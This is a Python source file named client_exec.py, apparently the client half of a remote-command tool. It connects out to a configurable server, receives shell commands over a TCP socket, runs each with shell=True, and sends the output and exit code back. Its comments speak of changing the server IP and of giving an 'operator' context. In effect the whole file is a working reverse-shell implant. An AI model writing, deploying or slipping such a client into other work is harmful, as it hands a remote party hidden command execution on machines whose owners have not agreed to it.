# client_exec.py
import socket
import subprocess
import sys
import traceback
import os
SERVER_HOST = "127.0.0.1"   # change to server IP
SERVER_PORT = 5556

def run_command(cmd: str, timeout=30):
    if cmd == "user":
        return os.getlogin()
    """
    Run a shell command string and return combined stdout+stderr.
    Uses shell=True so commands can be passed as plain strings like "ls -la".
    """
    try:
        completed = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        out = completed.stdout or ""
        err = completed.stderr or ""
        # Prepend exit code info for operator context
        return f"[exit_code={completed.returncode}]\n{out}{err}"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out\n"
    except Exception:
        return "[!] Exception running command:\n" + traceback.format_exc()

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"Failed to connect to {SERVER_HOST}:{SERVER_PORT} -> {e}", file=sys.stderr)
        return

    try:
        while True:
            # Receive a command. This assumes server sends a command as a single message.
            # If your server uses a different framing (length-prefix, JSON, etc.) adapt accordingly.
            data = sock.recv(4096)
            if not data:
                print("[*] Server closed connection")
                break

            command = data.decode(errors="replace").strip()
            if not command:
                # ignore empty commands
                continue

            # Optional: handle a simple "exit" or "quit" command to close the client
            if command.lower() in ("exit", "quit", "bye"):
                print("[*] Received exit command, shutting down client.")
                break

            # Run the OS command and get output
            output = run_command(command, timeout=60)

            # Ensure we always send bytes and use sendall
            try:
                sock.sendall(output.encode())
            except BrokenPipeError:
                print("[!] Broken pipe when sending output, server probably disconnected.")
                break

    except KeyboardInterrupt:
        print("\n[*] Interrupted by user, closing.")
    finally:
        try:
            sock.close()
        except Exception:
            pass

if __name__ == "__main__":
    main()
